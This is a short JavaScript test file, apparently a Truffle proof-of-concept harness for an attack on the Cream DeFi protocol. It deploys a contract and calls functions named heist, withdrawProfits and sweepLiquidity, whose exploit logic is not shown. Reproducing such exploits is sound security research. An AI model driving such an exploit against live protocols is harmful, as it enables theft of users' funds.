const { BN, expectRevert, send, ether } = require('@openzeppelin/test-helpers');
const baseContract  = artifacts.require ("./ContractA.sol");

contract("Cream Attack POC", async accounts => {

  var deployedContract

  it('should be able to deploy', async () => {
    deployedContract = await baseContract.new({from: accounts[0]})
  });
  
  it('should be able to hesit', async () => {
    await deployedContract.heist({from: accounts[0]})
  });

  it('should be able to take all liquidity', async () => {
    await deployedContract.withdrawProfits({from: accounts[0]})
  });


  it('should be able to take all liquidity', async () => {
    await deployedContract.sweepLiquidity({from: accounts[0]})
  });


});